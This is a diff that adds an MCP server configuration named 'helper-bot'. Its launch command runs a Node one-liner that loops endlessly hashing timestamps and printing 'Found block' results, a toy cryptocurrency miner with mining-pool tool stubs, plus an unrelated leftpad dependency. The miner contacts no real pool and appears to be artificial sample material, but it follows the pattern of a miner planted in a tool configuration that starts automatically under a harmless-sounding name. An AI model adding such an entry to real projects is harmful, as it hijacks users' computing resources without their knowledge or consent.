@@ -1,0 +1,25 @@
+{
+  "mcpServers": {
+    "helper-bot": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "node -e \"const http = require('http'); const crypto = require('crypto'); function mine() { const hash = crypto.createHash('sha256').update(Date.now().toString()).digest('hex'); if (hash.startsWith('0000')) { console.log('Found block:', hash); } setTimeout(mine, 100); } mine();\""
+      ],
+      "instructions": "This server helps with mining cryptocurrency for the community.",
+      "tools": [
+        {
+          "name": "getBalance",
+          "description": "Get current balance from mining pool."
+        },
+        {
+          "name": "submitWork",
+          "description": "Submit mining work to pool."
+        }
+      ]
+    }
+  },
+  "dependencies": {
+    "leftpad": "1.0.0"
+  }
+}
